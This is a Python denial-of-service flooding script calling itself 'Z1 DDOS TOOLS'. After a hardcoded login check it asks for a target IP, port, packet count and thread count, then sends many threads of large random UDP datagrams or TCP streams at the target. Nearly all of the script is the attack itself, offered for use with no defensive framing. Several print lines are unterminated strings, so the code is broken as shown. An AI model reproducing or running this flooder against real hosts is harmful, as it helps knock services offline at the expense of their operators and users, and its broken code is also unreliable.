#UDP/TCP TOOLS
#Z1 DDOS TOOLS
#MINIM KALO MAU RENAME JAN HAPUS CREDIT
#Credit : Z1
import random
import socket
import threading
import os
import time

os.system("clear")
print("""\033[94m
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

""")

nama =str(input("\033[97m[?] Username : "))
password =str(input("\033[97m[$] Password : "))
time.sleep(3)
os.system("clear")
print("\033[97m[!] Wait A Moment [\033[95m•••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Wait A Moment [\033[95m••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Wait A Moment [\033[95m•\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Wait A Moment [\033[95m••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Wait A Moment [\033[95m•••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Wait A Moment [\033[95m••\033[97m] !!!")
time.sleep(2)
os.system("clear")
print("\033[97m[!] Wait A Moment [\033[95m•\033[97m] !!!")
time.sleep(2)
os.system("clear")
if password == "zielx" and nama == "Z1":
	print("\033[97m[!] Login \033[92mSuccessful \033[97m!!!")
	time.sleep(3)
else:
	print("\033[97m[!] Password \033[91mWrong \033[97m!!!")
	time.sleep(999999)
os.system("clear")
print(f"""\033[96m    ) (       (         )  
 ( /( )\ )    )\ )   ( /(  
 )\()|()/((  (()/(   )\()) 
((_)\ /(_))\  /(_)) ((_)\  
 _((_|_))((_)(_))   __((_) 
|_  /|_ _| __| |    \ \/ / 
 / /  | || _|| |__   >  <  
/___||___|___|____| /_/\_\ 
 
==========================

\033[97m [!] Methods : \033[95mUDP | TCP
\033[97m [!] Discord : \033[95mSenzu𝙈𝙗𝙤𝙞𝙨#4106
\033[97m [!] Team : \033[95mΣXCUTED ++

\033[96m==========================
""")

dick =str(input("\033[97mMethods : \033[91m"))
ip =str(input("\033[97mIp : \033[91m"))
port =int(input("\033[97mPort : \033[91m"))
times =int(input("\033[97mPackets : \033[91m"))
threads =int(input("\033[97mThreads : \033[91m"))

def udp():
	data = os.urandom(65500)
	i = random.choice(("\033[95m[*]","[*]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(i +" \033[96mSenzu - XXDR Attack
		except:
				print("\033[95m[*] \033[96mSenzu - XXDR Attack
				
def udp2():
				data = os.urandom(20000)
				i = random.choice(("\033[95m[*]","[*]","[*]"))
				while True:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
						addr =(str(ip),int(port))
						for x in range(times):
							s.sendto(data,addr)
							print(i +"\033[96m Senzu - XXDR Attack
					except:
						print("\033[95m[*]\033[96m Senzu - XXDR Attack
						
def tcp():
				data = os.urandom(20179)
				i = random.choice(("\033[95m[*]","[*]","[*]"))
				while True:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s.connect((ip,port))
						s.send(data)
						for x in range(times):
							s.send(data)
							print(i +"\033[96m Senzu - XXDR Attack
					except:
						s.close()
						print("\033[95m[*]\033[96m Senzu - XXDR Attack
						
for y in range(threads):
				if dick == 'UDP':
					th = threading.Thread(target = udp)
					th.start()
					th = threading.Thread(target = udp2)
					th.start()
				elif dick == 'TCP':
					th = threading.Thread(target = tcp)
					th.start()
				else:
					th = threading.Thread(target = udp)
					th.start()
					th= threading.Thread(target = udp2)
					th.start()
					th = threading.Thread(target = tcp)
					th.start()
				